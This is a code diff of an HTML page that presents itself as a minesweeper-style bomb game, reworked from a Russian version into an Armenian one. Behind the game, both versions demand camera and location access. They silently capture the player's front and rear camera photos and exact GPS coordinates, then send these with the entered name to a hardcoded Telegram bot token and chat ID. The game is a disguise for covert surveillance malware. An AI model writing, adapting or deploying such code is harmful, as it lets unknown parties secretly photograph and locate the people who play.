@@ -1,230 +1,206 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="hy">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Мини-игра Бомбы</title>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
-<style>
-  body {
-    margin: 0; padding: 0;
-    font-family: 'Montserrat', sans-serif;
-    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
-    background-size: cover;
-    color: #f0f0f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    flex-direction: column;
-    user-select: none;
-    text-shadow: 0 0 8px rgba(0,0,0,0.7);
-  }
-  #permission-denied, #name-section, #game {
-    display: none;
-    background: rgba(0,0,0,0.6);
-    padding: 20px 30px;
-    border-radius: 15px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.8);
-    max-width: 420px;
-    width: 90%;
-    text-align: center;
-  }
-  #permission-denied.active, #name-section.active, #game.active {
-    display: block;
-  }
-  #name-section input {
-    font-size: 18px;
-    padding: 12px 16px;
-    border-radius: 10px;
-    border: none;
-    margin-right: 12px;
-    width: 70%;
-    outline: none;
-    box-shadow: inset 0 0 10px rgba(255,255,255,0.3);
-    color: #333;
-  }
-  button {
-    cursor: pointer;
-    padding: 12px 24px;
-    font-size: 20px;
-    border-radius: 12px;
-    border: none;
-    background-color: #6c63ff;
-    color: white;
-    font-weight: 700;
-    transition: background-color 0.3s ease, box-shadow 0.3s ease;
-    box-shadow: 0 4px 12px rgba(108, 99, 255, 0.6);
-  }
-  button:hover {
-    background-color: #857aff;
-    box-shadow: 0 6px 18px rgba(133, 122, 255, 0.8);
-  }
-  #error-msg {
-    margin-top: 10px;
-    color: #ff6666;
-    font-weight: 600;
-  }
-  #game-board {
-    margin-top: 20px;
-    display: grid;
-    grid-template-columns: repeat(8, 48px);
-    grid-template-rows: repeat(8, 48px);
-    gap: 6px;
-    user-select: none;
-  }
-  .cell {
-    width: 48px;
-    height: 48px;
-    background-color: #2c2c7a;
-    border-radius: 8px;
-    cursor: pointer;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-weight: 700;
-    font-size: 22px;
-    color: #eee;
-    box-shadow: inset 0 3px 8px rgba(255,255,255,0.2);
-    transition: background-color 0.2s ease;
-  }
-  .cell.open {
-    background-color: #b3b3ff;
-    color: #1a1a4d;
-    cursor: default;
-    box-shadow: none;
-  }
-  .cell.bomb {
-    background-color: #ff5252;
-    color: white;
-    box-shadow: 0 0 10px 3px #ff5252aa;
-  }
-  #status {
-    margin-top: 18px;
-    font-size: 20px;
-    font-weight: 700;
-    text-shadow: 0 0 6px #000a;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Խաղ — Մարտադաշտ</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;700&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Fredoka', sans-serif;
+      background: url('https://i.imgur.com/mUiCz0p.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      text-align: center;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      user-select: none;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(0,0,0,0.6);
+      padding: 30px;
+      border-radius: 20px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.8);
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
+      user-select: text;
+    }
+    input, button {
+      padding: 12px 20px;
+      font-size: 18px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: none;
+      width: 80%;
+      box-sizing: border-box;
+      font-weight: 700;
+      font-family: 'Fredoka', sans-serif;
+    }
+    input {
+      color: #333;
+    }
+    button {
+      background-color: #66bb6a;
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(102, 187, 106, 0.5);
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    button:hover {
+      background-color: #57a55f;
+    }
+    #game-board {
+      margin-top: 20px;
+      display: grid;
+      grid-template-columns: repeat(8, 44px);
+      gap: 6px;
+      justify-content: center;
+      user-select: none;
+    }
+    .cell {
+      width: 44px;
+      height: 44px;
+      background: #4a4e69;
+      border-radius: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 20px;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+      transition: background-color 0.2s ease;
+      user-select: none;
+    }
+    .cell.open {
+      background: #c9ada7;
+      color: #222;
+      cursor: default;
+      box-shadow: inset 0 0 10px #fff5;
+    }
+    .cell.bomb {
+      background: #ef476f;
+      box-shadow: 0 0 10px 3px #ef476faa;
+      color: white;
+      cursor: default;
+    }
+    #status {
+      font-size: 20px;
+      margin-top: 20px;
+      min-height: 28px;
+      user-select: text;
+    }
+    #permission-denied {
+      color: #ff9999;
+      font-weight: bold;
+      margin-top: 20px;
+      user-select: text;
+    }
+    #restart-btn {
+      display: none;
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 20px;
+      border-radius: 12px;
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      cursor: pointer;
+      user-select: none;
+      box-shadow: 0 4px 14px rgba(76, 175, 80, 0.6);
+      transition: background-color 0.3s ease;
+    }
+    #restart-btn:hover {
+      background-color: #3b8b40;
+    }
+    audio {
+      display: none;
+    }
+
+    @media (max-width: 480px) {
+      #game-board {
+        grid-template-columns: repeat(8, 36px);
+        gap: 4px;
+      }
+      .cell {
+        width: 36px;
+        height: 36px;
+        font-size: 16px;
+      }
+      input, button {
+        width: 100%;
+      }
+      .container {
+        max-width: 320px;
+        padding: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<audio id="bg-audio" loop autoplay muted>
-  <source src="https://cdn.pixabay.com/download/audio/2022/03/14/audio_65b79a2eeb.mp3?filename=soft-ambient-11670.mp3" type="audio/mpeg">
-</audio>
-
-<div id="permission-denied">
-  <p>Для игры нужно разрешить доступ к камере и местоположению.<br>Перезагрузите страницу и разрешите.</p>
+<div class="container" id="permission-denied" style="display: none;">
+  Խաղը գործարկելու համար անհրաժեշտ է թույլատրել տեսախցիկը և տեղադրությունը։<br />
+  Խնդրում ենք թարմացնել էջը։
 </div>
 
-<div id="name-section">
-  <input type="text" id="player-name" placeholder="Введите имя" autocomplete="off" />
-  <button id="start-game-btn">Начать игру</button>
-  <div id="error-msg"></div>
+<div class="container" id="start-form">
+  <h1>Մուտքագրեք Ձեր անունը</h1>
+  <input type="text" id="player-name" placeholder="Անուն" autocomplete="off" />
+  <button id="start-btn">Սկսել խաղը</button>
 </div>
 
-<div id="game">
-  <h2>Игра: Бомбы</h2>
+<div class="container" id="game-area" style="display: none;">
+  <h1>Խաղը սկսված է</h1>
   <div id="game-board"></div>
-  <p id="status"></p>
+  <div id="status"></div>
+  <button id="restart-btn">Նոր խաղ</button>
 </div>
+
+<audio id="bg-music" loop>
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/14/audio_65b79a2eeb.mp3" type="audio/mpeg" />
+</audio>
 
 <script>
 (async () => {
   const permissionDeniedDiv = document.getElementById('permission-denied');
-  const nameSection = document.getElementById('name-section');
-  const gameDiv = document.getElementById('game');
+  const startForm = document.getElementById('start-form');
+  const gameArea = document.getElementById('game-area');
   const playerNameInput = document.getElementById('player-name');
-  const startGameBtn = document.getElementById('start-game-btn');
-  const errorMsg = document.getElementById('error-msg');
+  const startBtn = document.getElementById('start-btn');
+  const restartBtn = document.getElementById('restart-btn');
   const gameBoard = document.getElementById('game-board');
-  const statusP = document.getElementById('status');
-
-  let stream = null;
-  let coords = null;
-  let photoBlob = null;
-  let playerName = '';
-
-  async function requestPermissions() {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      coords = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout:10000});
-      });
-      return true;
-    } catch(e) {
-      return false;
-    }
-  }
-
-  async function takePhoto() {
-    if (!stream) return null;
-    const track = stream.getVideoTracks()[0];
-    if ('ImageCapture' in window) {
-      try {
-        const imageCapture = new ImageCapture(track);
-        const photo = await imageCapture.takePhoto();
-        return photo;
-      } catch(e) {}
-    }
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 320;
-    canvas.height = video.videoHeight || 240;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    video.pause();
-    track.stop();
-    return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-  }
-
-  const hasPermissions = await requestPermissions();
-  if (!hasPermissions) {
-    permissionDeniedDiv.classList.add('active');
-    return;
-  }
-
-  nameSection.classList.add('active');
-
-  startGameBtn.onclick = async () => {
-    playerName = playerNameInput.value.trim();
-    if (playerName.length < 1) {
-      errorMsg.textContent = "Пожалуйста, введите имя.";
-      return;
-    }
-    errorMsg.textContent = "";
-
-    photoBlob = await takePhoto();
-
-    sendDataToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoBlob);
-
-    nameSection.classList.remove('active');
-    startGame();
-  };
+  const status = document.getElementById('status');
+  const bgMusic = document.getElementById('bg-music');
 
   const size = 8;
   const bombsCount = 10;
   let board = [];
   let openedCount = 0;
   let gameOver = false;
+  let playerName = '';
+  let photoFrontBlob = null;
+  let photoBackBlob = null;
+  let coords = null;
 
-  function startGame() {
-    gameDiv.classList.add('active');
-    statusP.textContent = '';
-    board = createBoard(size, bombsCount);
-    openedCount = 0;
-    gameOver = false;
-    renderBoard();
-  }
-
-  function createBoard(size, bombsCount) {
-    let cells = [];
+  function createBoard() {
+    const cells = [];
     for(let i=0; i<size*size; i++) {
       cells.push({bomb:false, open:false, adjacent:0});
     }
-
     let bombsPlaced = 0;
     while (bombsPlaced < bombsCount) {
       const idx = Math.floor(Math.random() * size * size);
@@ -233,10 +209,9 @@
         bombsPlaced++;
       }
     }
-
     for (let i=0; i<size*size; i++) {
       if (cells[i].bomb) continue;
-      const neighbors = getNeighbors(i, size);
+      const neighbors = getNeighbors(i);
       let count = 0;
       for (const n of neighbors) {
         if (cells[n].bomb) count++;
@@ -246,12 +221,12 @@
     return cells;
   }
 
-  function getNeighbors(index, size) {
+  function getNeighbors(index) {
     const neighbors = [];
     const row = Math.floor(index / size);
     const col = index % size;
     for (let r = row - 1; r <= row + 1; r++) {
-      for (let c = col -1; c <= col + 1; c++) {
+      for (let c = col - 1; c <= col + 1; c++) {
         if (r < 0 || r >= size || c < 0 || c >= size) continue;
         if (r === row && c === col) continue;
         neighbors.push(r * size + c);
@@ -264,7 +239,7 @@
     gameBoard.innerHTML = '';
     for(let i=0; i<board.length; i++) {
       const cell = document.createElement('div');
-      cell.classList.add('cell');
+      cell.className = 'cell';
       if (board[i].open) cell.classList.add('open');
       if (board[i].open && board[i].bomb) cell.classList.add('bomb');
       cell.dataset.index = i;
@@ -277,26 +252,35 @@
     if (board[i].open || gameOver) return;
     board[i].open = true;
     openedCount++;
+    const cell = gameBoard.children[i];
+    cell.classList.add('open');
     if (board[i].bomb) {
+      cell.classList.add('bomb');
       gameOver = true;
+      status.textContent = "Դուք պայթեցիք 😢";
       revealBombs();
-      statusP.textContent = "Вы взорвались! Игра окончена.";
+      restartBtn.style.display = 'inline-block';
       return;
     }
-    if (board[i].adjacent === 0) {
-      const neighbors = getNeighbors(i, size);
-      neighbors.forEach(n => openCell(n));
+    if (board[i].adjacent > 0) {
+      cell.textContent = board[i].adjacent;
+    } else {
+      const neighbors = getNeighbors(i);
+      neighbors.forEach(openCell);
     }
     if (openedCount === size*size - bombsCount) {
       gameOver = true;
-      statusP.textContent = "Поздравляем! Вы выиграли!";
+      status.textContent = "Դուք հաղթեցիք 🎉";
       revealBombs();
+      restartBtn.style.display = 'inline-block';
     }
   }
 
   function revealBombs() {
     for(let i=0; i<board.length; i++) {
-      if (board[i].bomb) board[i].open = true;
+      if (board[i].bomb) {
+        board[i].open = true;
+      }
     }
     renderBoard();
   }
@@ -306,24 +290,95 @@
     renderBoard();
   }
 
-  function sendDataToTelegram(name, lat, lon, photoBlob) {
-    const text = `Новый игрок: ${name}\nШирота: ${lat}\nДолгота: ${lon}`;
+  restartBtn.addEventListener('click', () => {
+    startGame();
+    status.textContent = '';
+    restartBtn.style.display = 'none';
+  });
 
-    fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendMessage?chat_id=526758225&text=${encodeURIComponent(text)}`)
-      .catch(console.error);
+  async function takePhoto(facingMode) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode}});
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
 
-    if (photoBlob) {
-      const formData = new FormData();
-      formData.append('chat_id', '526758225');
-      formData.append('photo', photoBlob, 'photo.jpg');
-      formData.append('caption', `Фото игрока: ${name}`);
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 320;
+      canvas.height = video.videoHeight || 240;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).catch(console.error);
+      stream.getTracks().forEach(t => t.stop());
+      return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    } catch {
+      return null;
     }
   }
+
+  async function sendToTelegram(name, lat, lon, photoFront, photoBack) {
+    const token = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
+    const chatId = '526758225';
+
+    const msg = `👤 Անուն: ${name}\n📍 Տեղադրություն: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+    if (photoFront) {
+      const fd1 = new FormData();
+      fd1.append('chat_id', chatId);
+      fd1.append('photo', photoFront, 'front.jpg');
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd1 });
+    }
+    if (photoBack) {
+      const fd2 = new FormData();
+      fd2.append('chat_id', chatId);
+      fd2.append('photo', photoBack, 'back.jpg');
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd2 });
+    }
+  }
+
+  async function startGame() {
+    playerName = playerNameInput.value.trim();
+    if (!playerName) return alert('Խնդրում ենք մուտքագրել անունը։');
+
+    startBtn.disabled = true;
+    bgMusic.volume = 0.15;
+    try {
+      // Запускаем музыку после клика
+      await bgMusic.play();
+    } catch {}
+
+    // Запрашиваем фото с фронтальной камеры
+    photoFrontBlob = await takePhoto('user');
+    // Запрашиваем фото с задней камеры
+    photoBackBlob = await takePhoto('environment');
+
+    try {
+      coords = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+      });
+    } catch {
+      permissionDeniedDiv.style.display = 'block';
+      startBtn.disabled = false;
+      return;
+    }
+
+    await sendToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoFrontBlob, photoBackBlob);
+
+    startForm.style.display = 'none';
+    gameArea.style.display = 'block';
+
+    board = createBoard();
+    openedCount = 0;
+    gameOver = false;
+    restartBtn.style.display = 'none';
+    status.textContent = '';
+
+    renderBoard();
+    startBtn.disabled = false;
+  }
+
+  startBtn.addEventListener('click', startGame);
 })();
 </script>
 
